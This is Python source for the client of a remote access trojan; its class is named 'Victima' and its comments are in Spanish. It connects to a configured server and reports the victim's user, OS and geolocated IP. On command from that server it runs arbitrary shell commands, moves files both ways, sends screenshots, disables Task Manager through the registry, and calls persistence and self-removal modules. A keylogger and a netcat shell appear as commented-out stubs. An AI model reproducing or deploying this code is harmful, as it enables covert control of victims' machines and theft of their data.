
# LIBRERIAS STANDARD

import re
import os
import sys
import time
import json
import ctypes
import socket
import argparse
import platform
import datetime
import threading
import subprocess
import configparser
#import pyscreenshot
import urllib.request
from getpass import getuser


# MODULOS DE OPERACIONES

import netcat 
import modulos.persistencia as persistencia
import modulos.autoremover as autoremover


# PROGRAMA PRINCIPAL

plataforma = sys.platform

if plataforma.startswith('win'):
	plataforma = "win"
elif plataforma.startswith('linux'):
	plataforma = "linux"
elif plataforma.startswith('darwin'):
	plataforma = "mac"
else:
	print (" No existen variantes para este sistema.")
	sys.exit(0)



class Victima(object):

	# -------- CONFIGURACION DEL SERVIDOR --------

	def __init__(self, ip, port):

		super(Victima, self).__init__()
		self.client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.direccion = str(ip)
		self.puerto = int(port)


	# -------- ACCIONES BASICAS --------

	def iniciar(self):
		self.client.connect((self.direccion, self.puerto))
		return	


	def detener(self):
		self.client.close()
		return


	def enviar(self,msg):
		self.client.send(bytes(msg,"utf-8"))
		return

	def enviar_todo(self,msg):
		self.client.sendall(bytes(msg,"utf-8"))
		return


	def recibir(self):
		raw_msg = self.client.recv(1024) 
		msg = (raw_msg).decode('utf-8')
		return msg


	def enviar_comandos(self,datos):
		comando = subprocess.Popen ((datos).strip(), shell = True, stdout = subprocess.PIPE, stderr = subprocess.STDOUT, stdin = subprocess.PIPE, universal_newlines=True)

		contenido = comando.stdout.read(1024)

		while (contenido):
			self.client.sendall(bytes(contenido,'utf-8'))
			contenido = comando.stdout.read(1024)

		time.sleep(0.01)
		self.client.sendall(b'ok')

		return


	def recibir_bytes(self):
		raw_msg = self.client.recv(1024) 
		return raw_msg


	# -------- RECOPILAR INFORMACION DE VICTIMA Y ENVIARLA --------


	def obtener_informacion(self):
		host = getuser()	
		sistema = platform.system()	
		url = urllib.request.urlopen("https://geoip-db.com/json")
		objeto = json.loads(url.read().decode())
		ip_info = objeto["city"] + "," + objeto["IPv4"] + "," + objeto["country_name"] + "," + objeto["state"]
		return [host,sistema,ip_info]


	def enviar_informacion(self):
		informacion = self.obtener_informacion()
		self.enviar(informacion[0])
		self.recibir()
		self.enviar(informacion[1])
		self.recibir()
		self.enviar(informacion[2])
		return	


	# -------- CONTROL SOBRE LA VICTIMA --------

	def control_total(self):
		while (True):
			datosEleccion = self.recibir()
			#print(datosEleccion)

			if (datosEleccion=="matar"):
				self.detener()
				break


			# ARCHIVOS	

			elif (datosEleccion=="subir"):
				self.subir_archivos()

			elif (datosEleccion=="descargar"):
				self.descargar_archivos()

			# EXTRAS

			elif (datosEleccion=="cmd"):
				self.cmd()		

			elif (datosEleccion=="netcat"):
				self.netcat()			

			elif (datosEleccion=="persistencia"):
				self.persistencia()

			elif (datosEleccion=="autoremover"):
				self.autoremover()

			elif (datosEleccion=="taskManagerDisable"):
				self.taskManagerDisable()

			elif (datosEleccion=="screenshot"):
				self.screenshot()

			elif (datosEleccion=="keylogger"):
				self.keylogger()

			# RED	

			elif (datosEleccion=="ifconfig"):
				self.ifconfig(plataforma)

			# SISTEMA	

			elif (datosEleccion=="pwd"):
				self.pwd()

			elif (datosEleccion=="ls"):
				self.ls()

			elif ("cd" in datosEleccion):
				self.cd(datosEleccion)


		return


	# -------- CONTROLADORES DEL PROGRAMA ---------

	def control_ruta(self,path,signo):
		
		ruta = path.split(signo)
		if (ruta.pop()!=""):
			verificar_ruta = signo.join(ruta)

			if (os.path.isdir(verificar_ruta)):
				return True
			else:
				return False
		else:
			return False
		

	# -------- MODULOS DE CONTROL --------

	# EXTRAS

	def cmd(self):
		
		datos = self.recibir()
		#print(datos)

		while(True):

			if("cd " in datos):
				directorio = datos.replace('cd ', "")
				
				try:
					os.chdir(directorio)
					directorio = os.getcwd()
					self.client.send(bytes("\n Ubicacion cambiada a: " + directorio,"utf-8"))
				except OSError: 
					self.client.send(bytes("\n No existe la ubicacion...",'utf-8'))

			elif (datos=='detener') or (datos=='exit'):
				#print('estoy deteniendome')
				self.enviar("ok")
				break

			else:
				self.enviar_comandos(datos)

			datos = self.recibir()

			#print(datos)

		return

	def taskManagerDisable(self):	

		self.enviar('ok')
		self.recibir()

		if (plataforma=="win"):

			verficar = subprocess.Popen('REG QUERY "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v DisableTaskMgr /s',shell=True,stdout=subprocess.PIPE)

			if (b"DisableTaskMgr" not in verficar.stdout.read()):
				os.system("REG ADD HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /t REG_DWORD /d 1 /f")
				self.enviar(" Administrador de tareas deshabilitado")
			else:
				os.system("REG DELETE HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System\\ /v DisableTaskMgr /f")
				self.enviar(" Administrador de tareas habilitado")

		else:
			self.enviar(" Este modulo no esta disponible.")


		return

	def netcat(self):
		time.sleep(1.5)
		#netcat.reverse_shell()
		#os.system('python3 netcat.py &')
		return ("Modulo en desarrollo")


	def persistencia(self):
		proceso,msg = persistencia.activar(plataforma)
		self.enviar(msg)
		return


	def autoremover(self):
		proceso,msg = autoremover.activar(plataforma)
		self.enviar(msg)
		return


	def screenshot(self):
		# Recibe y envia el mensaje de "ok" del modo 
		self.enviar('ok')

		data = datetime.datetime.today()
		nombre_archivo = getuser()+'_'+str(data.day)+str(data.month)+str(data.year)+"-"+str(data.hour)+str(data.minute)+str(data.second)+".png"

		if (plataforma=="win"):
			import pyautogui

			captura = pyautogui.screenshot()
			captura.save(nombre_archivo)

		elif (plataforma=="linux") or (plataforma=="mac"):
			import pyscreenshot

			captura = pyscreenshot.grab()
			captura.save(nombre_archivo)

		else:
			self.recibir()
			self.enviar('failed')
			return False


		self.recibir()
		self.enviar(nombre_archivo)

		self.recibir()
		self.enviar(str(os.path.getsize(nombre_archivo)))


		with open(nombre_archivo,"rb") as archivo:
			contenido = archivo.read(1024)
			while (contenido):
				self.client.send(contenido)
				contenido = archivo.read(1024)

		os.remove(nombre_archivo)


		return


	# def keylogger(self):

	# 	from pynput.keyboard import Key, Listener
		
	# 	def on_press(key):
	# 		self.enviar(str(key))

	# 		datos = self.recibir()

	# 		if (datos=="detener"):
	# 			return False



	# 	with Listener(on_press=on_press) as listener:
	# 	    listener.join()


	# 	self.enviar('listo')

	# 	return


	# ARCHIVOS	

	def subir_archivos(self):

		# Envia el ok del modo de uso
		self.enviar('ok')

		# Recibe la ruta de destino donde se va a guardar el archivo y envia el 'ok'
		ruta = self.recibir()
		destino = ruta

		if os.path.isdir(ruta):
			self.enviar('directorio')
			return False

		if (self.control_ruta(ruta,"/")) or (self.control_ruta(ruta,"\\")):
			self.enviar('ok')

		else:
			self.enviar('failed')
			return False


		size = int(self.recibir())
		self.enviar('ok')
		print(size)

		# Abre el archivo nuevo 
		with open(destino, "wb") as archivo_destino:
			#contenido = self.client.recv(1024)
			#print(os.path.getsize(destino))
			while (size>0):
				contenido = self.client.recv(1024)
				archivo_destino.write(contenido)
				size-=len(contenido)
				print(size)

		return

	def descargar_archivos(self):

		# Envia el ok del modo
		self.enviar('ok')

		# Recibe ruta origen
		path = self.recibir()
		origen = path

		if os.path.isdir(path):
			self.enviar(str('-1'))
			return False

		if (self.control_ruta(path,"/")) or (self.control_ruta(path,"\\")):

			if (os.path.exists(origen)):
				# Envia tamanio del archivo origen
				self.enviar(str(os.path.getsize(origen)))
				self.recibir()
				time.sleep(1)

				# Se prepara para el envio de datos del archivo
				with open(origen, "rb") as archivo_origen:
						contenido = archivo_origen.read(1024)
						while contenido:
							self.client.sendall(contenido)
							contenido = archivo_origen.read(1024)
			else:
				 self.enviar(str('-1'))

		else:
			self.enviar(str('-1'))

		return 


	# RED	

	def ifconfig(self,plataforma):
		
		if (plataforma=="win"):
			self.enviar_comandos("ipconfig")

		elif (plataforma=="linux") or (plataforma=="mac"):
			self.enviar_comandos("ip addr")

		return


	# SISTEMA	

	def pwd(self):

		if (plataforma=="win"):
			self.enviar_comandos("echo %cd%")

		elif (plataforma=="linux") or (plataforma=="mac"):
			self.enviar_comandos("pwd")

		return

	def ls(self):

		if (plataforma=="win"):
			self.enviar_comandos("dir")

		elif (plataforma=="linux") or (plataforma=="mac"):
			self.enviar_comandos("ls")

		return

	def cd(self,datos):
		directorio = datos.replace('cd ', "")
				
		try:
			os.chdir(directorio)
			directorio = os.getcwd()
			self.client.send(bytes("\n Ubicacion cambiada a: " + directorio + "\n","utf-8"))
		except OSError: 
			self.client.send(bytes("\n No existe la ubicacion...\n",'utf-8'))

		return



def main(configuraciones):

	s = Victima(configuraciones[0][0],configuraciones[0][1])	
	s.iniciar()
	s.enviar_informacion()
	s.control_total()

if __name__ == '__main__':
	
	configuracion = configparser.ConfigParser()
	configuracion.read("client.conf")

	seccionConectar = configuracion["CONECTAR"]
	seccionPersistencia = configuracion["PERSISTENCIA"]
	
	conectar = [seccionConectar["Servidor"],seccionConectar["Puerto"]]
	persistencia = [seccionPersistencia["NombreBicho"],seccionPersistencia["NombreRegistro"],seccionPersistencia["RutaDestino"]]

	configuraciones = [conectar,persistencia]

	main(configuraciones)